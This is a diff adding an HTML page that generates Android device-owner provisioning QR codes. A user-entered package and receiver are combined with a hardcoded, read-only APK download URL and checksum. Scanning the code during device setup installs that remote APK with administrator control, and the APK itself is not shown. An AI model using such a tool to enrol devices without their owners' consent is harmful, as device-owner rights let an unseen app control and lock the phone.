@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Android Provisioning QR Generator</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <style>
+        body { font-family: system-ui, -apple-system, sans-serif; max-width: 600px; margin: 2rem auto; padding: 0 1rem; line-height: 1.5; }
+        .input-group { margin-bottom: 1rem; }
+        label { display: block; margin-bottom: 0.5rem; font-weight: bold; }
+        input { width: 100%; padding: 0.5rem; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        #qrcode { margin-top: 2rem; display: flex; justify-content: center; }
+        .hint { font-size: 0.875rem; color: #666; margin-top: 0.25rem; }
+        code { background: #f4f4f4; padding: 0.2rem 0.4rem; border-radius: 4px; }
+    </style>
+</head>
+<body>
+    <h1>Provisioning QR Generator</h1>
+    
+    <div class="input-group">
+        <label>Package Name</label>
+        <input type="text" id="packageName" placeholder="e.g. com.example.myapp" oninput="updateQR()">
+        <div class="hint">Found in your AndroidManifest.xml (package="...")</div>
+    </div>
+
+    <div class="input-group">
+        <label>Receiver Class</label>
+        <input type="text" id="receiverClass" placeholder="e.g. .MyDeviceAdminReceiver" value=".DeviceAdmin" oninput="updateQR()">
+        <div class="hint">The name of your DeviceAdminReceiver class. If relative, start with dot.</div>
+    </div>
+
+    <div class="input-group">
+        <label>Download URL</label>
+        <input type="text" id="downloadUrl" value="https://lockap-fawn.vercel.app/myleatest.apk" readonly style="background: #f4f4f4;">
+    </div>
+
+    <div class="input-group">
+        <label>Checksum (URL-safe Base64)</label>
+        <input type="text" id="checksum" value="BxKodetG_jMNArXCdv6DM7R_is6UYDhTC5t88t7eAew" readonly style="background: #f4f4f4;">
+    </div>
+
+    <div id="qrcode"></div>
+
+    <script>
+        const qrcode = new QRCode(document.getElementById("qrcode"), {
+            width: 300,
+            height: 300
+        });
+
+        function updateQR() {
+            const pkg = document.getElementById('packageName').value.trim();
+            const receiver = document.getElementById('receiverClass').value.trim();
+            const url = document.getElementById('downloadUrl').value;
+            const hash = document.getElementById('checksum').value;
+
+            if (!pkg || !receiver) {
+                // Don't clear, just wait for input
+                return;
+            }
+
+            // Construct full component name
+            // If receiver starts with ., prepend pkg
+            // But the format required is package/class
+            // e.g. com.example/.MyReceiver
+            
+            const componentName = `${pkg}/${receiver}`;
+
+            const jsonPayload = {
+                "android.app.extra.PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME": componentName,
+                "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION": url,
+                "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_CHECKSUM": hash,
+                "android.app.extra.PROVISIONING_LEAVE_ALL_SYSTEM_APPS_ENABLED": true
+            };
+
+            const jsonString = JSON.stringify(jsonPayload);
+            console.log(jsonString);
+            qrcode.makeCode(jsonString);
+        }
+        
+        // Initial call
+        updateQR();
+    </script>
+</body>
+</html>
